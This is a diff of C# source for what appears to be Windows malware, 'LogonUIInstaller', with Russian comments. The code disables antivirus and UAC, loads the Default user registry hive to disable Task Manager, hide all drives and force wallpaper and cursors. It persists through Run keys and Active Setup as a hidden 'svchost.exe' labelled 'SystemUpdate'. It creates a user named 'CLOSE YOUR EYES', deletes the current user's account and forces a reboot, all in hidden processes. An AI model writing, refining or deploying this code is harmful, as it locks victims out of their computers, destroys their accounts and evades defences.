@@ -45,7 +45,7 @@ namespace LogonUIInstaller
                 ExtractAllResources();
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
-                ApplySettingsToDefaultUser();
+                ApplySettingsToDefaultProfile();
                 ReplaceUserAccountFixed();
                 AddToStartupWithStage2();
                 ForceReboot();
@@ -330,61 +330,44 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== НАСТРОЙКИ ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ ====================
-        private static void ApplySettingsToDefaultUser()
+        // ==================== НАСТРОЙКИ DEFAULT ПРОФИЛЯ ====================
+        private static void ApplySettingsToDefaultProfile()
         {
             try
             {
-                string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
-                string cursorPath = Path.Combine(appDataPath, "fg.ani");
-                string destPath = Path.Combine(appDataPath, "svchost.exe");
+                string defaultProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", "Default", "NTUSER.DAT");
+                if (!File.Exists(defaultProfilePath)) return;
 
-                // Применяем к .DEFAULT (шаблон для новых пользователей)
-                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Control Panel\Desktop"))
+                string tempKey = "DefaultUserTemp_" + Guid.NewGuid().ToString("N").Substring(0, 8);
+
+                // Загружаем куст Default User
+                Process p1 = Process.Start(new ProcessStartInfo
                 {
-                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
-                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
-                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
-                }
+                    FileName = "reg",
+                    Arguments = $"load \"HKEY_USERS\\{tempKey}\" \"{defaultProfilePath}\"",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+                p1?.WaitForExit(3000);
+                p1?.Close();
 
-                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Control Panel\Cursors"))
+                // Применяем настройки
+                ApplyRegistrySettingsToHive(tempKey);
+
+                // Выгружаем куст
+                Process p2 = Process.Start(new ProcessStartInfo
                 {
-                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
-                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
-                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
-                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
-                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
-                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
-                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
-                    key.SetValue("No", cursorPath, RegistryValueKind.String);
-                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
-                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
-                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
-                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
-                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
-                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
-                }
+                    FileName = "reg",
+                    Arguments = $"unload \"HKEY_USERS\\{tempKey}\"",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+                p2?.WaitForExit(3000);
+                p2?.Close();
 
-                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
-                {
-                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
-                }
-
-                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-                {
-                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
-                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
-                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
-                }
-
-                // Автозапуск в .DEFAULT
-                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run"))
-                {
-                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
-                }
-
-                // Отключаем экран настройки Windows (OOBE) для всех новых пользователей
+                // Отключаем OOBE
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
                 {
                     key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
@@ -399,111 +382,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ЗАМЕНА ПОЛЬЗОВАТЕЛЯ (ФИКС) ====================
-        private static void ReplaceUserAccountFixed()
-        {
-            try
-            {
-                string currentUser = Environment.UserName;
-                string newUser = "CLOSE YOUR EYES";
-                string destPath = Path.Combine(appDataPath, "svchost.exe");
-
-                // 1. Создаем пользователя (НЕ администратора, обычный пользователь)
-                Process p1 = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "net",
-                    Arguments = $"user \"{newUser}\" /add /active:yes /passwordchg:no",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-                p1?.WaitForExit(5000);
-                p1?.Close();
-
-                // 2. Убеждаемся, что пользователь НЕ в группе администраторов
-                // (по умолчанию net user добавляет в группу Users, не в Administrators)
-                // Дополнительно удаляем из администраторов, если вдруг
-                Process p2 = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "net",
-                    Arguments = $"localgroup Administrators \"{newUser}\" /delete",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-                p2?.WaitForExit(3000);
-                p2?.Close();
-
-                // 3. Получаем SID нового пользователя
-                string sid = GetUserSID(newUser);
-                if (!string.IsNullOrEmpty(sid))
-                {
-                    // 4. Пытаемся загрузить куст и применить настройки
-                    string profilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
-                    if (Directory.Exists(profilePath))
-                    {
-                        string ntuserPath = Path.Combine(profilePath, "NTUSER.DAT");
-                        if (File.Exists(ntuserPath))
-                        {
-                            try
-                            {
-                                // Загружаем куст
-                                Process p3 = Process.Start(new ProcessStartInfo
-                                {
-                                    FileName = "reg",
-                                    Arguments = $"load \"HKEY_USERS\\{sid}\" \"{ntuserPath}\"",
-                                    CreateNoWindow = true,
-                                    WindowStyle = ProcessWindowStyle.Hidden,
-                                    UseShellExecute = false
-                                });
-                                p3?.WaitForExit(3000);
-                                p3?.Close();
-
-                                // Применяем настройки к загруженному кусту
-                                ApplyRegistrySettingsToHive(sid);
-
-                                // Выгружаем куст
-                                Process p4 = Process.Start(new ProcessStartInfo
-                                {
-                                    FileName = "reg",
-                                    Arguments = $"unload \"HKEY_USERS\\{sid}\"",
-                                    CreateNoWindow = true,
-                                    WindowStyle = ProcessWindowStyle.Hidden,
-                                    UseShellExecute = false
-                                });
-                                p4?.WaitForExit(3000);
-                                p4?.Close();
-                            }
-                            catch { }
-                        }
-                    }
-                }
-
-                // 5. Добавляем Active Setup для первого входа
-                string guid = Guid.NewGuid().ToString("B").ToUpper();
-                using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
-                {
-                    key.SetValue("", "SystemUpdate", RegistryValueKind.String);
-                    key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
-                    key.SetValue("Version", "1.0", RegistryValueKind.String);
-                }
-
-                // 6. Удаляем старого пользователя
-                Process p5 = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "net",
-                    Arguments = $"user {currentUser} /delete /y",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-                p5?.WaitForExit(3000);
-                p5?.Close();
-            }
-            catch { }
-        }
-
-        private static void ApplyRegistrySettingsToHive(string sid)
+        private static void ApplyRegistrySettingsToHive(string hiveKey)
         {
             try
             {
@@ -511,14 +390,14 @@ namespace LogonUIInstaller
                 string cursorPath = Path.Combine(appDataPath, "fg.ani");
                 string destPath = Path.Combine(appDataPath, "svchost.exe");
 
-                using (var key = Registry.Users.CreateSubKey($@"{sid}\Control Panel\Desktop"))
+                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Desktop"))
                 {
                     key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                     key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                     key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                 }
 
-                using (var key = Registry.Users.CreateSubKey($@"{sid}\Control Panel\Cursors"))
+                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Cursors"))
                 {
                     key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                     key.SetValue("Help", cursorPath, RegistryValueKind.String);
@@ -536,20 +415,20 @@ namespace LogonUIInstaller
                     key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                 }
 
-                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                 {
                     key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                     key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                 }
 
-                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                 {
                     key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                     key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                     key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                 }
 
-                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Run"))
+                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Run"))
                 {
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                 }
@@ -557,27 +436,56 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static string GetUserSID(string username)
+        // ==================== ЗАМЕНА ПОЛЬЗОВАТЕЛЯ ====================
+        private static void ReplaceUserAccountFixed()
         {
             try
             {
-                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"))
+                string currentUser = Environment.UserName;
+                string newUser = "CLOSE YOUR EYES";
+
+                Process p1 = Process.Start(new ProcessStartInfo
                 {
-                    foreach (string sid in key.GetSubKeyNames())
-                    {
-                        using (var subKey = key.OpenSubKey(sid))
-                        {
-                            string profilePath = subKey.GetValue("ProfileImagePath") as string;
-                            if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
-                            {
-                                return sid;
-                            }
-                        }
-                    }
+                    FileName = "net",
+                    Arguments = $"user \"{newUser}\" /add /active:yes /passwordchg:no",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+                p1?.WaitForExit(5000);
+                p1?.Close();
+
+                Process p2 = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"localgroup Administrators \"{newUser}\" /delete",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+                p2?.WaitForExit(3000);
+                p2?.Close();
+
+                string guid = Guid.NewGuid().ToString("B").ToUpper();
+                using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
+                {
+                    key.SetValue("", "SystemUpdate", RegistryValueKind.String);
+                    key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
+                    key.SetValue("Version", "1.0", RegistryValueKind.String);
                 }
+
+                Process p5 = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"user {currentUser} /delete /y",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+                p5?.WaitForExit(3000);
+                p5?.Close();
             }
             catch { }
-            return null;
         }
 
         // ==================== УСТАНОВКА АВТОЗАПУСКА ====================
@@ -601,7 +509,6 @@ namespace LogonUIInstaller
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                 File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
 
-                // HKLM для всех пользователей (включая нового)
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                 
